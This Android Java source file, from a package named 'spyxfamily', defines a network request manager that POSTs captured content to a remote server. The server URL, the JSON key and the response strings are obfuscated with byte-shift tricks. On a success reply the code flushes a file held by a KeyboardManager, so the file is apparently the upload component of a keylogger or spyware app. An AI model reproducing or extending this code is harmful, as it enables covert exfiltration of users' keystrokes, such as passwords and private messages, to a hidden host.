package com.example.spyxfamily;

import android.content.Context;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

public class RequestManager {
    private static RequestManager instance;
    private final static String url = (new Object() {int t;public String toString() {byte[] buf = new byte[25];t = 646741733;buf[0] = (byte) (t >>> 20);t = 187817232;buf[1] = (byte) (t >>> 6);t = -744000658;buf[2] = (byte) (t >>> 19);t = -1183998938;buf[3] = (byte) (t >>> 6);t = 1285149788;buf[4] = (byte) (t >>> 11);t = -1950269029;buf[5] = (byte) (t >>> 22);t = -1749346218;buf[6] = (byte) (t >>> 23);t = -550971828;buf[7] = (byte) (t >>> 10);t = -833424572;buf[8] = (byte) (t >>> 4);t = 639318109;buf[9] = (byte) (t >>> 1);t = -1940141441;buf[10] = (byte) (t >>> 22);t = -294848674;buf[11] = (byte) (t >>> 17);t = 241951175;buf[12] = (byte) (t >>> 22);t = 1725455423;buf[13] = (byte) (t >>> 9);t = 223162745;buf[14] = (byte) (t >>> 8);t = 1098861163;buf[15] = (byte) (t >>> 1);t = 966475137;buf[16] = (byte) (t >>> 24);t = 1622002560;buf[17] = (byte) (t >>> 6);t = -1550378867;buf[18] = (byte) (t >>> 20);t = 1326563755;buf[19] = (byte) (t >>> 11);t = -49945342;buf[20] = (byte) (t >>> 13);t = 180945435;buf[21] = (byte) (t >>> 17);t = 1386066099;buf[22] = (byte) (t >>> 7);t = 1839017640;buf[23] = (byte) (t >>> 14);t = -672702000;buf[24] = (byte) (t >>> 8);return new String(buf);}}.toString());
    private RequestQueue requestQueue;
    private static Context ctx;

        private RequestManager(Context context) {
            ctx = context;
            requestQueue = getRequestQueue();
        }

        public static synchronized RequestManager getInstance(Context context) {
            if (instance == null) {
                instance = new RequestManager(context);
            }
            return instance;
        }

        public RequestQueue getRequestQueue() {
            if (requestQueue == null) {
                // getApplicationContext() is key, it keeps you from leaking the
                // Activity or BroadcastReceiver if someone passes one in.
                requestQueue = Volley.newRequestQueue(ctx.getApplicationContext());
            }
            return requestQueue;
        }

        public <T> void addToRequestQueue(Request<T> req) {
            getRequestQueue().add(req);
        }

    public JsonObjectRequest buildRequest(String content) {
        try {
            // Make new json object and put params in it
            JSONObject jsonParams = new JSONObject();
            jsonParams.put((new Object() {int t;public String toString() {byte[] buf = new byte[7];t = 711342144;buf[0] = (byte) (t >>> 12);t = 1057128892;buf[1] = (byte) (t >>> 2);t = -1915675086;buf[2] = (byte) (t >>> 21);t = 2132618437;buf[3] = (byte) (t >>> 14);t = -1154913372;buf[4] = (byte) (t >>> 19);t = -172535558;buf[5] = (byte) (t >>> 15);t = -791315548;buf[6] = (byte) (t >>> 3);return new String(buf);}}.toString()), content);

            // Building a request
            return new JsonObjectRequest(
                    Request.Method.POST, // Method
                    url, // Url
                    jsonParams,  // Post parameters
                    new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {
                            // Handle the response
                            try {
                                if (response.getString((new Object() {int t;public String toString() {byte[] buf = new byte[6];t = -1865303637;buf[0] = (byte) (t >>> 7);t = 292481119;buf[1] = (byte) (t >>> 9);t = -1406709957;buf[2] = (byte) (t >>> 21);t = 973399532;buf[3] = (byte) (t >>> 23);t = 391744807;buf[4] = (byte) (t >>> 20);t = 1030977521;buf[5] = (byte) (t >>> 16);return new String(buf);}}.toString())).equals((new Object() {int t;public String toString() {byte[] buf = new byte[7];t = -190365906;buf[0] = (byte) (t >>> 12);t = 2129899253;buf[1] = (byte) (t >>> 11);t = -618741648;buf[2] = (byte) (t >>> 19);t = -1506033592;buf[3] = (byte) (t >>> 20);t = -631679926;buf[4] = (byte) (t >>> 14);t = 36937310;buf[5] = (byte) (t >>> 11);t = -2086739587;buf[6] = (byte) (t >>> 19);return new String(buf);}}.toString()))) {
                                    KeyboardManager.getInstance(ctx).flushFile();
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    },
                    new Response.ErrorListener(){
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            // Handle the error
                        }
                    });
        } catch(JSONException ex){
            // Catch if something went wrong with the params
            return null;
        }
    }
}
